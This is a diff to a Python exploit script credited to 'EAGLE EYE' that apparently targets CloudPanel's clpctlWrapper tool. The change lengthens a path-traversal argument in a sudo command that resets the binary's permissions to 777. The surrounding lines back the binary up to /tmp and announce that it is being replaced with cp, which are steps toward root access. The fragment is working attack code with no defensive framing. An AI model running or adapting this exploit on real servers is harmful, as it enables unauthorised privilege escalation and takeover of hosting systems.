@@ -15,7 +15,7 @@ def exec_command(command):
 def exploit():
     print('[-] AUTHOR : EAGLE EYE [-]')
     print('[+] Overriding file to writable')
-    exec_command('sudo /usr/bin/clpctlWrapper system:permissions:reset --files=777 --path=../../usr/bin/clpctlWrapper')
+    exec_command('sudo /usr/bin/clpctlWrapper system:permissions:reset --files=777 --path=../../../../../../../../../../usr/bin/clpctlWrapper')
     print('[+] Backup clpctlWrapper into tmp...')
     exec_command('cp /usr/bin/clpctlWrapper /tmp/clpctlWrapper')
     print('[+] Replacing clpctlWrapper with cp...')
